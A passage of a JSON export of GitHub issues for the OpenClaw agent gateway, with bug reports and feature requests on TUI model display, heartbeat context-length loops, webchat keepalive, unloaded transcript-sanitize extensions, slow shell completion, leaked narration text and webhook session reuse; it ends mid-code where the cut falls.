      "body": "## Bug Report\n\n### Environment\n- OpenClaw 2026.1.30 (76b5208)\n- TUI connected to gateway via WebSocket\n- Telegram channel active\n\n### Issue 1: Stale model in TUI footer after config.patch\n\n**Steps to reproduce:**\n1. Start TUI, connect to gateway (shows e.g. `anthropic/claude-opus-4-5`)\n2. Run `gateway config.patch` to change model to `openai/gpt-5.2`\n3. Gateway restarts via SIGUSR1\n4. TUI reconnects\n\n**Expected:** Footer updates to show new model (`openai/gpt-5.2`)\n**Actual:** Footer still shows old model (`anthropic/claude-opus-4-5`)\n\n**Root cause:** In `tui.js`, the `onConnected` handler calls `refreshAgents()`, `loadHistory()`, and `updateFooter()` — but does NOT call `refreshSessionInfo()`. The footer reads from `sessionInfo.model` which remains stale.\n\n**Fix:** Add `await refreshSessionInfo();` in the `onConnected` handler before `updateFooter()`.\n\n### Issue 2: '(no output)' for Telegram-routed replies\n\n**Steps to reproduce:**\n1. Have TUI open watching the main session\n2. Send a message via Telegram\n3. Agent replies (visible in Telegram)\n4. TUI shows the user message but displays `(no output)` for the assistant reply\n\n**Expected:** TUI should show the assistant's reply text\n**Actual:** Shows `(no output)` — the `resolveFinalAssistantText` function finds both `finalText` and `streamedText` empty\n\n**Likely cause:** When the reply routes to Telegram, the TUI stream assembler may not receive the content chunks or the finalize message may arrive without the full text content.\n\n### Suggested Fix for Issue 1\n\nIn `dist/tui/tui.js`, `onConnected` handler (~line 532):\n\n```js\nclient.onConnected = () => {\n    // ...\n    void (async () => {\n        await refreshAgents();\n+       await refreshSessionInfo();  // <-- Add this\n        updateHeader();\n        await loadHistory();\n        // ...\n        updateFooter();\n    })();\n};\n```\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5782",
      "createdAt": "2026-01-31T23:48:52Z",
      "updatedAt": "2026-02-11T04:11:34Z",
      "author": "LagWizard",
      "labels": [
        "bug",
        "tui"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "tui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875633025,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5782#issuecomment-3875633025",
          "createdAt": "2026-02-10T06:34:19Z",
          "updatedAt": "2026-02-10T06:34:19Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 5999,
      "title": "[Bug]: Heartbeats Broken. Infinite HTTP 400 Exceeded Context Length Errors.",
      "body": "## Summary\n\nOpenClaw repeatedly sends heartbeat requests that exceed the model’s maximum context length (~202,750 tokens), resulting in an infinite continuous HTTP 400 errors and a retry loop instead of graceful handling and heartbeats no longer working until gateway restarted.\n\n## Steps to reproduce\n\n1. Run clawdbot heartbeats continuously every 30m.\n2. Use Z.ai GLM4.7\n3. Have a heartbeats.md that specifies some tasks to do occasionally.\n4. Observe requests sent to the model exceeding its max context window.\n\n## Expected behavior\n\n- OpenClaw should detect when the prompt/context exceeds the model’s max token limit.\n- It should automatically compact or handle gracefully.\n\n## Actual behavior\n\n- Infinite consecutive HTTP 400 errors:\n- `Request XXXXX input tokens exceeds the model's maximum context length 202750`\n- Even though it only shows tokens 128k/205k on every repeated request\n- The agent continues retrying heartbeats with growing token counts.\n- System remains connected but effectively stalled forever and no heartbeats work (`gateway connected | idle`).\n\n## Environment\n\n- Clawdbot version: OpenClaw 1.30 and ClawdBot 1.24\n- OS: Ubuntu Linux\n\n## Logs or screenshots\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 137814 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 137855 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 137896 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 137937 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 137978 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 138019 input tokens exceeds the model's maximum context length 202750\n Read HEARTBEAT.md if it exists (workspace context). Follow it strictly. Do not infer or repeat old tasks from prior\n chats. If nothing needs attention, reply HEARTBEAT_OK.\nHTTP 400: Invalid API parameter. Request 138060 input tokens exceeds the model's maximum context length 202750\n gateway connected | idle\n agent main | session main | zai/glm-4.7 | tokens 128k/205k (63%)",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5999",
      "createdAt": "2026-02-01T05:38:03Z",
      "updatedAt": "2026-02-11T04:11:21Z",
      "author": "trevtravtrev",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875629979,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5999#issuecomment-3875629979",
          "createdAt": "2026-02-10T06:33:41Z",
          "updatedAt": "2026-02-10T06:33:41Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3875928450,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5999#issuecomment-3875928450",
          "createdAt": "2026-02-10T07:44:39Z",
          "updatedAt": "2026-02-10T07:49:40Z",
          "author": "steinbeck",
          "body": "This is a really serious issue and needs to be fixed. This is an update that more than one person is experiencing this. Closing this issue is not an option. "
        }
      ]
    },
    {
      "number": 6044,
      "title": "[Bug]: TypeError: provider.trim is not a function on models auth add",
      "body": "## Summary\n\nI see `TypeError: provider.trim is not a function on models auth add` while running `openclaw models auth add`\n\n## Steps to reproduce\n\n1. Run `openclaw models auth add`\n2. Press Escape for all inputs expected\n3. See the error on console `TypeError: provider.trim is not a function`\n\n## Expected behavior\n\nNo errors shown\n\n## Actual behavior\n\n`TypeError: provider.trim is not a function`\n\n## Environment\n\n- Clawdbot version: 2026.1.30\n- OS: Windows in WSL Ubuntu\n- Install method (pnpm/npx/docker/etc): One-liner script (pnpm)\n\n## Logs or screenshots\n\n<img width=\"1162\" height=\"282\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/c496468f-e203-48be-8d73-d1d14bcdbbc7\" />\n\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6044",
      "createdAt": "2026-02-01T06:53:07Z",
      "updatedAt": "2026-02-11T04:11:18Z",
      "author": "vivganes",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "linux",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3875629105,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6044#issuecomment-3875629105",
          "createdAt": "2026-02-10T06:33:32Z",
          "updatedAt": "2026-02-10T06:33:32Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3875798402,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6044#issuecomment-3875798402",
          "createdAt": "2026-02-10T07:20:06Z",
          "updatedAt": "2026-02-10T07:20:06Z",
          "author": "vivganes",
          "body": "There is a PR #6059 that fixes this "
        }
      ]
    },
    {
      "number": 6087,
      "title": "Browser webchat client missing tick/keepalive monitoring - silent disconnections",
      "body": "## Bug Description\n\nThe browser WebSocket client in the webchat dashboard is missing tick/keepalive monitoring that the Node.js client has. This causes silent disconnections that manifest as the agent appearing to \"hang\" indefinitely.\n\n## Expected Behavior\n\nWhen the WebSocket connection silently disconnects (due to tab backgrounding, network changes, or mobile sleep), the client should detect this and reconnect automatically.\n\n## Actual Behavior\n\nThe browser client:\n- Continues to think it's connected\n- Misses all incoming messages\n- Shows agent as \"thinking\" forever\n- User has to manually refresh to see actual responses\n\n## Root Cause\n\n**Node.js client (`gateway/client.js`)** monitors for `tick` events and closes/reconnects if 2x the tick interval passes without receiving one:\n```javascript\nstartTickWatch() {\n    this.tickTimer = setInterval(() => {\n        if (gap > this.tickIntervalMs * 2) {\n            this.ws?.close(4000, \"tick timeout\");\n        }\n    }, interval);\n}\n```\n\n**Browser client** has NO tick handling - it only relies on `onclose`/`onerror` events which may not fire reliably on silent disconnects.\n\n## Additional Issues\n\n1. **No `visibilitychange` handler** - No detection of tab being backgrounded/foregrounded\n2. **Gap detection doesn't recover** - Only shows error message, no resync\n3. **No proactive health checks** - Only reacts to `onclose`/`onerror` events\n\n## Reproduction Steps\n\n1. Open webchat dashboard\n2. Send a message that triggers a long-running agent task\n3. Switch browser tabs or put device to sleep for 60+ seconds\n4. Return to webchat tab\n5. Agent appears to be \"thinking\" forever\n6. Refresh page to see the actual response\n\n## Suggested Fix\n\n1. **Add tick monitoring to browser client:**\n   - Track `lastTick` timestamp\n   - Update on receiving `tick` events  \n   - Check periodically and close connection if stale\n\n2. **Add visibility handler:**\n   - Listen for `visibilitychange`\n   - On becoming visible, verify connection health\n   - Trigger reconnect if connection is stale\n\n3. **Add history resync on reconnect:**\n   - Fetch recent messages to catch anything missed\n   - Already partially implemented via `chat.history` RPC\n\n## Workarounds\n\n- Keep webchat tab in foreground during long operations\n- Refresh page if agent appears stuck\n- Check Debug tab for \"event gap detected\" errors\n- Use CLI or mobile app for critical interactions\n\n## Environment\n\n- Clawdbot version: Latest (Jan 2026)\n- Browser: Chrome/Safari (all browsers affected)\n- Platform: macOS\n\n## Severity\n\n**High** - Significantly impacts user experience and makes webchat unreliable for anything beyond quick interactions.",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6087",
      "createdAt": "2026-02-01T08:20:08Z",
      "updatedAt": "2026-02-11T04:11:13Z",
      "author": "jlmalone",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3833255273,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6087#issuecomment-3833255273",
          "createdAt": "2026-02-02T06:38:59Z",
          "updatedAt": "2026-02-02T06:38:59Z",
          "author": "moonsbe",
          "body": "Adding a +1 here — this is a frequent pain point. The 'event gap detected' error appears regularly during normal use (not just image uploads), requiring manual refresh each time.\n\nThe Node.js client's tick monitoring approach seems solid. Would be great to see this ported to the browser client. Happy to test a fix if needed."
        },
        {
          "id": 3875627998,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6087#issuecomment-3875627998",
          "createdAt": "2026-02-10T06:33:19Z",
          "updatedAt": "2026-02-10T06:33:19Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3876590856,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6087#issuecomment-3876590856",
          "createdAt": "2026-02-10T10:00:17Z",
          "updatedAt": "2026-02-10T10:00:17Z",
          "author": "jlmalone",
          "body": "It is still an issue"
        }
      ]
    },
    {
      "number": 6118,
      "title": "Bug: transcript-sanitize extension never loaded — causes tool_use_id mismatch in long sessions",
      "body": "# Bug: transcript-sanitize extension never loaded — causes tool_use_id mismatch in long sessions\n\n## Error Message\n\n```\nFailoverError: LLM request rejected: messages.268.content.1: unexpected `tool_use_id` found in `tool_result` blocks: toolu_01YDDkR7xihJHDSiQdF8VyzV. Each `tool_result` block must have a corresponding `tool_use` block in the previous message.\n```\n\nAlso appears as:\n\n```\nEmbedded agent failed before reply: LLM request rejected: messages.268.content.1: unexpected `tool_use_id` found in `tool_result` blocks\n```\n\n## Environment\n\n- Clawdbot gateway with Anthropic provider (Claude)\n- Long-running session (268+ messages)\n\n## Root Cause\n\nThe `transcript-sanitize` extension (`dist/agents/pi-extensions/transcript-sanitize.js`) exists and is designed to run `repairToolUseResultPairing()` on **every context build** via the `context` event hook. However, `buildEmbeddedExtensionPaths()` in `dist/agents/pi-embedded-runner/extensions.js` **never includes it** in the extension paths.\n\nThis means:\n- `repairToolUseResultPairing()` runs **once** at session load (via `sanitizeSessionHistory()`)\n- But it does **not** run on subsequent context builds during the same session\n- In long sessions, compaction, context pruning, and new message appends can cause `tool_result` blocks to become orphaned (referencing `tool_use` IDs that no longer exist in the preceding assistant message)\n- When the Anthropic API receives these orphaned references, it rejects the entire request\n\n## Proposed Fix\n\nIn `src/agents/pi-embedded-runner/extensions.ts`, add `transcript-sanitize` to `buildEmbeddedExtensionPaths()`:\n\n```typescript\nexport function buildEmbeddedExtensionPaths(params) {\n    const paths = [];\n    // Always include transcript-sanitize: repairs tool_use/tool_result pairing\n    // on every context build, not just at session load.\n    paths.push(resolvePiExtensionPath(\"transcript-sanitize\"));\n    if (resolveCompactionMode(params.cfg) === \"safeguard\") {\n        paths.push(resolvePiExtensionPath(\"compaction-safeguard\"));\n    }\n    const pruning = buildContextPruningExtension(params);\n    if (pruning.additionalExtensionPaths) {\n        paths.push(...pruning.additionalExtensionPaths);\n    }\n    return paths;\n}\n```\n\n## Workaround\n\nPatch `dist/agents/pi-embedded-runner/extensions.js` directly with the above change and restart the gateway. Note: this gets overwritten on update.\n\n## Searchable Keywords\n\n`unexpected tool_use_id`, `tool_result blocks`, `Each tool_result block must have a corresponding tool_use block`, `FailoverError`, `LLM request rejected`, `transcript-sanitize`, `repairToolUseResultPairing`\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6118",
      "createdAt": "2026-02-01T09:01:56Z",
      "updatedAt": "2026-02-11T04:11:11Z",
      "author": "Dinpo",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3844365703,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6118#issuecomment-3844365703",
          "createdAt": "2026-02-03T23:32:53Z",
          "updatedAt": "2026-02-03T23:32:53Z",
          "author": "graham-u",
          "body": "## Same root cause affects context-pruning and compaction-safeguard extensions\n\nThis issue correctly identifies that `buildEmbeddedExtensionPaths()` doesn't include `transcript-sanitize` in its return array. But there's a deeper problem: **the return value of `buildEmbeddedExtensionPaths()` is discarded by the caller**, so even if all the right paths are in the array, none of the embedded extensions will ever be loaded by the SDK.\n\n### The full chain\n\n**Step 1 — `attempt.js:365`**: `buildEmbeddedExtensionPaths()` is called, but only for its side effects (setting up WeakMap runtime state). The return value is never captured:\n\n```javascript\n// Call for side effects (sets compaction/pruning runtime state)\nbuildEmbeddedExtensionPaths({\n    cfg: params.config,\n    sessionManager,\n    provider: params.provider,\n    modelId: params.modelId,\n    model: params.model,\n});\n```\n\n**Step 2 — `attempt.js:387`**: `createAgentSession()` is called without a `resourceLoader` option and without any mechanism to pass the extension paths through:\n\n```javascript\n({ session } = await createAgentSession({\n    cwd: resolvedWorkspace,\n    agentDir,\n    authStorage: params.authStorage,\n    modelRegistry: params.modelRegistry,\n    model: params.model,\n    thinkingLevel: mapThinkingLevel(params.thinkLevel),\n    tools: builtInTools,\n    customTools: allCustomTools,\n    sessionManager,\n    settingsManager,\n}));\n```\n\n**Step 3 — `sdk.js:70-73`**: Since no `resourceLoader` is provided, `createAgentSession()` creates a fresh `DefaultResourceLoader` with an empty `additionalExtensionPaths`:\n\n```javascript\nif (!resourceLoader) {\n    resourceLoader = new DefaultResourceLoader({ cwd, agentDir, settingsManager });\n    await resourceLoader.reload();\n}\n```\n\n**Step 4 — `resource-loader.js:reload()`**: The resource loader discovers extensions from the standard directories (agent dir, project `.openclaw/extensions/`, CLI flags, package manager). The embedded extensions under `dist/agents/pi-extensions/` are **not** in any standard discovery path — they can only be loaded if explicitly passed as `additionalExtensionPaths`.\n\n**Step 5 — `runner.js:408`**: On each API call, `ExtensionRunner.emitContext()` iterates loaded extensions looking for `\"context\"` event handlers. Since no embedded extensions were loaded, there are no handlers. Messages pass through unmodified.\n\n### What this means in practice\n\n- `buildEmbeddedExtensionPaths()` correctly builds the path array and sets up the WeakMap runtime state (e.g., `setContextPruningRuntime()`, `setCompactionSafeguardRuntime()`)\n- The runtime state is valid and ready to be consumed\n- But the extension files that register `api.on(\"context\", ...)` handlers are never dynamically imported by the SDK\n- So `transcript-sanitize`, `context-pruning`, and `compaction-safeguard` **all** silently fail to load — none of their event handlers can fire at runtime\n\nFor context-pruning specifically, you can confirm this by adding instrumentation to `dist/agents/pi-extensions/context-pruning/extension.js` — the file is never imported, so any logging at module scope or inside the `api.on(\"context\", ...)` handler produces zero output, while `[PRUNE-DEBUG]` logging inside `buildContextPruningExtension()` in `extensions.js` does fire and reports the extension as loaded.\n\n### Suggested fix\n\nThe proposed fix in the issue description (adding `transcript-sanitize` to the return array) is necessary but not sufficient. The return value also needs to be threaded into the SDK's extension loading. One approach:\n\n```javascript\n// attempt.js — capture the return value and pass it through\nconst embeddedExtensionPaths = buildEmbeddedExtensionPaths({\n    cfg: params.config,\n    sessionManager,\n    provider: params.provider,\n    modelId: params.modelId,\n    model: params.model,\n});\n\n// ... then pass to createAgentSession via a pre-configured resource loader:\nconst resourceLoader = new DefaultResourceLoader({\n    cwd: resolvedWorkspace,\n    agentDir,\n    settingsManager,\n    additionalExtensionPaths: embeddedExtensionPaths.map(p => ({\n        path: p,\n        metadata: { source: \"embedded\", scope: \"session\", origin: \"top-level\" },\n    })),\n});\nawait resourceLoader.reload();\n\n({ session } = await createAgentSession({\n    // ... existing options ...\n    resourceLoader,\n}));\n```\n\nAlternatively, `createAgentSession()` could accept an `additionalExtensionPaths` option and merge them into the resource loader it creates internally.\n\nEither way, both halves need to be fixed: the array contents (this issue's proposal) and the discarded return value in `attempt.js`."
        },
        {
          "id": 3882017481,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6118#issuecomment-3882017481",
          "createdAt": "2026-02-11T04:11:10Z",
          "updatedAt": "2026-02-11T04:11:10Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        }
      ]
    },
    {
      "number": 13754,
      "title": "Feature request: session:compaction hook event",
      "body": "## Summary\n\nRequest a new hook event `session:compaction` (or `session:post-compaction`) that fires after auto-compaction or `/compact` completes.\n\n## Use Case\n\nAgents with persistent memory systems (daily logs, project files) need to re-bootstrap context after compaction. Currently:\n\n1. `memoryFlush` runs **before** compaction — great for saving context to disk\n2. Compaction summarizes and discards older messages\n3. After compaction, the agent has a summary but has lost awareness of detailed context stored in workspace files (daily logs, project notes)\n4. **No mechanism exists to trigger a context re-read after compaction**\n\nThe `agent:bootstrap` hook only fires on session creation, not after compaction. The planned `session:start` / `session:end` events wouldn't cover this either.\n\n## Proposed Solution\n\nAdd a `session:compaction` event to the hooks system that fires after compaction completes. The event context should include:\n\n- `sessionKey` — which session was compacted\n- `compactionCount` — how many compactions have occurred\n- `trigger` — \\auto\\ or \\manual\\ (/compact)\n\nThis would allow hooks to inject a system event like \"Read today's daily log\" into the session, ensuring agents with file-based memory systems can recover context after compaction.\n\n## Workaround\n\nCurrently strengthening AGENTS.md instructions to tell the agent to re-read daily logs after compaction, but this relies on agent compliance which is unreliable.\n\n## Environment\n\n- OpenClaw 2026.2.9\n- Memory backend: QMD\n- Using structured daily logs + project files for persistent memory",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13754",
      "createdAt": "2026-02-11T00:24:14Z",
      "updatedAt": "2026-02-11T04:09:54Z",
      "author": "coleclawson",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13810,
      "title": "completion command triggers full plugin loader via jiti, adding ~24s to shell startup",
      "body": "## Summary\n\n`openclaw completion --shell bash` (and zsh) takes ~24 seconds because it unnecessarily triggers the plugin loader, which uses `jiti` to Babel-transpile hundreds of files at runtime.\n\nThis makes `source <(openclaw completion --shell bash)` in `.bashrc`/`.zshrc` add ~24s to every new shell session. The tool already detects this pattern via `usesSlowDynamicCompletion()`, but the completion command itself is the source of the slowness.\n\n## Environment\n\n- OpenClaw 2026.2.6-3\n- Fedora 43, Linux 6.18.8\n- Node.js via Linuxbrew\n- Enabled plugins: telegram, slack\n\n## Root Cause\n\nWhen `openclaw completion --shell bash` runs, the `registerCompletionCli` action ([completion-cli, ~line 148](https://github.com/openclaw/openclaw/blob/main/src/cli/completion-cli.ts)) eagerly registers **all** subcommands:\n\n```js\nconst entries = getSubCliEntries();\nfor (const entry of entries) {\n    if (entry.name === \"completion\") continue;\n    await registerSubCliByName(program, entry.name);\n}\n```\n\nTwo of these subcommands (`pairing` and `plugins`) call `loadConfig()`, which triggers the full plugin loader. The plugin loader uses **jiti** (runtime Babel transpiler) to load enabled plugins. Each plugin imports from `openclaw/plugin-sdk` (791KB, 24K lines), pulling in a massive dependency tree.\n\n### CPU Profile Breakdown\n\n| Component | Time |\n|-----------|------|\n| jiti / Babel transpilation | **17.6s** (68%) |\n| Garbage collection | 2.8s |\n| Module loading / resolution | ~3s |\n| Everything else | ~2.5s |\n| **Total** | **~26s** |\n\njiti transpiles **423 files** to load just the telegram plugin's dependency tree. The slack plugin adds only ~160ms because modules are already cached from telegram.\n\n### Profiling Commands Used\n\n```bash\n# Wall-clock time\ntime openclaw completion --shell bash > /dev/null\n# real  0m23.991s  user  0m34.775s  sys  0m1.262s\n\n# CPU profile\nnode --cpu-prof /path/to/openclaw.mjs completion --shell bash > /dev/null\n\n# jiti debug output showing 423 transpilations\n# (via createJiti with debug: true)\n```\n\n## Suggested Fixes\n\n1. **Don't load plugins for completion generation.** The completion command only needs the command tree structure (names, options, descriptions) — not live plugin instances. The `pairing` and `plugins` subcommands could register their CLI structure without calling `loadConfig()`.\n\n2. **Ship pre-compiled plugins.** The extensions ship as `.ts` source files transpiled at runtime via jiti. Pre-compiling them at package build time would eliminate the Babel overhead entirely.\n\n3. **Run `completion --write-state` as a post-install hook** and have the default shell integration source from the cached file, avoiding re-generation on every shell startup.\n\n## Workaround\n\nCache the completion output to a file:\n\n```bash\nopenclaw completion --shell bash > ~/.openclaw_completion.bash\n# In .bashrc, replace:\n#   source <(openclaw completion --shell bash)\n# with:\nsource ~/.openclaw_completion.bash\n```",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13810",
      "createdAt": "2026-02-11T02:19:02Z",
      "updatedAt": "2026-02-11T04:09:02Z",
      "author": "polcn",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881819273,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13810#issuecomment-3881819273",
          "createdAt": "2026-02-11T02:48:38Z",
          "updatedAt": "2026-02-11T02:48:38Z",
          "author": "asklee-klawd",
          "body": "## Root Cause Confirmed\n\nI traced the slow startup to `src/cli/program/register.subclis.ts` lines 171-188. Both `pairing` and `plugins` subcommands call `await loadConfig()` during CLI registration, which triggers the full plugin loader (jiti transpilation of 423 files).\n\n```typescript\n// register.subclis.ts line 175\nregisterPluginCliCommands(program, await loadConfig());  // <-- 24s hit\n\n// register.subclis.ts line 186\nregisterPluginCliCommands(program, await loadConfig());  // <-- 24s hit\n```\n\n## Proposed Fix\n\nAdd an environment variable to skip plugin loading during completion generation:\n\n```diff\n// completion-cli.ts line 240\n+ process.env.OPENCLAW_SKIP_PLUGIN_LOAD = '1';\n  const entries = getSubCliEntries();\n  for (const entry of entries) {\n    ...\n  }\n+ delete process.env.OPENCLAW_SKIP_PLUGIN_LOAD;\n\n// register.subclis.ts line 173\n  register: async (program) => {\n+   if (!process.env.OPENCLAW_SKIP_PLUGIN_LOAD) {\n      const { registerPluginCliCommands } = await import(\"../../plugins/cli.js\");\n      registerPluginCliCommands(program, await loadConfig());\n+   }\n    const mod = await import(\"../pairing-cli.js\");\n    mod.registerPairingCli(program);\n  },\n\n// Same for plugins entry line 183\n```\n\n## Impact\n\n- Completion generation: 24s → <2s (reduces jiti overhead)\n- Normal `pairing`/`plugins` commands: unchanged\n- Shell startup time: 24s → instant (when using cached completions)\n\n## Testing Required\n\n- ✅ Completion script includes all subcommands\n- ✅ `openclaw pairing` works normally (plugins load)\n- ✅ `openclaw plugins` works normally  \n- ✅ Generated completion is functional\n\nHappy to submit a PR if this approach looks good to maintainers."
        }
      ]
    },
    {
      "number": 12960,
      "title": "Narration/thinking text leaks to messaging channels between tool calls",
      "body": "## Description\n\nWhen the agent processes a request from a messaging channel (iMessage, Telegram, etc.) and makes multiple tool calls, any text generated between tool calls is sent to the source channel as a message. This leaks internal narration/thinking text to end users.\n\n## Steps to Reproduce\n\n1. Send a message to the agent via any messaging channel (iMessage, Telegram, etc.)\n2. The agent processes the request using multiple sequential tool calls\n3. Text the agent generates between tool calls (narration, thinking, processing notes) gets sent as actual messages to the channel\n\n## Expected Behavior\n\nOnly the agent's final, intentional reply should be sent to the messaging channel. Internal narration between tool calls should be suppressed.\n\n## Actual Behavior\n\nInternal processing text like:\n- \"Let me check which chat this is from.\"\n- \"The model has named ranges. Now I'll rebuild the analysis sheets with dynamic formulas.\"  \n- \"Catbox is flaky. Let me just email Joe the files instead:\"\n- Error messages from failed tool calls\n\n...all get sent as real messages to the user/group chat.\n\n## Impact\n\n- Confusing for users who receive walls of internal processing text\n- Leaks implementation details and thought process\n- Particularly problematic in group chats where multiple non-technical users see the narration\n- Affects ALL messaging channels (iMessage, Telegram, Slack, BlueBubbles, etc.) since the bug is upstream of the channel layer\n\n## Environment\n\n- OpenClaw version: 2026.2.6-3\n- OS: macOS (Darwin 25.2.0, arm64)\n- Model: anthropic/claude-opus-4-6\n- Channels affected: iMessage, Telegram (all channels)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12960",
      "createdAt": "2026-02-10T00:07:19Z",
      "updatedAt": "2026-02-11T04:08:42Z",
      "author": "claudia-patel",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "slack",
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3882012019,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12960#issuecomment-3882012019",
          "createdAt": "2026-02-11T04:08:42Z",
          "updatedAt": "2026-02-11T04:08:42Z",
          "author": "dylanfeltus",
          "body": "**Workaround confirmed working:**\n\nSet `streamMode: \"off\"` for Telegram to stop the leak:\n\n```json\n\"channels\": {\n  \"telegram\": {\n    \"streamMode\": \"off\"\n  }\n}\n```\n\nOr per-account if using multi-bot setup:\n\n```json\n\"channels\": {\n  \"telegram\": {\n    \"accounts\": {\n      \"your-account\": {\n        \"streamMode\": \"off\"\n      }\n    }\n  }\n}\n```\n\nThis disables Telegram draft streaming entirely. You lose the \"typing preview\" but internal narration stops leaking.\n\nTested on OpenClaw 2026.2.6-3 with Claude Opus 4.6."
        }
      ]
    },
    {
      "number": 11665,
      "title": "[Feature]: Webhook hook sessions should reuse existing session when sessionKey is consistent (multi-turn support)",
      "body": "## Problem\n\nThe docs for `/hooks/agent` state:\n\n> `sessionKey` optional (string): Using a consistent key allows for a **multi-turn conversation** within the hook context.\n\nHowever, this does not work as documented. `resolveCronSession()` in `src/cron/isolated-agent/run.ts` **always generates a new `crypto.randomUUID()` sessionId** and sets `isNewSession: true`, even when a session already exists for that key:\n\n```javascript\nfunction resolveCronSession(params) {\n    const entry = store[params.sessionKey]; // reads existing entry\n    const sessionId = crypto.randomUUID(); // ← always new!\n    return {\n        sessionEntry: { sessionId, ... },\n        isNewSession: true // ← always true!\n    };\n}\n```\n\nThis means every webhook invocation creates a brand new session file, losing all conversation history. The `sessionKey` only preserves metadata (model, thinkingLevel, label) but not the actual conversation.\n\n## Use Case\n\nWe have a WhatsApp restaurant ordering bot that receives messages via Evolution API webhooks through a custom transform. The transform returns a consistent `sessionKey` per customer phone number:\n\n```javascript\nreturn {\n    kind: \"agent\",\n    message: prompt,\n    sessionKey: `hook:webhook:comanda:${storeId}:${phoneNumber}`,\n    ...\n};\n```\n\nExpected: customer sends multiple messages, bot remembers conversation context (e.g., items added to cart).\n\nActual: each message starts a fresh session. Bot has no memory of previous messages. We had to build a workaround that loads conversation history from MySQL into the prompt on every message (~2-3K extra tokens per turn).\n\n## Evidence\n\nAfter 6 minutes of testing with the same phone number, we found 5 different session files created:\n- `sessions.json` correctly maps the sessionKey to the **latest** sessionId\n- But the old sessionIds become orphaned `.jsonl` files (319 accumulated over 2 days)\n\n## Proposed Solution\n\nWhen a hook/webhook provides a consistent `sessionKey` and a session already exists for that key, **reuse the existing session** instead of creating a new one:\n\n```javascript\nfunction resolveCronSession(params) {\n    const entry = 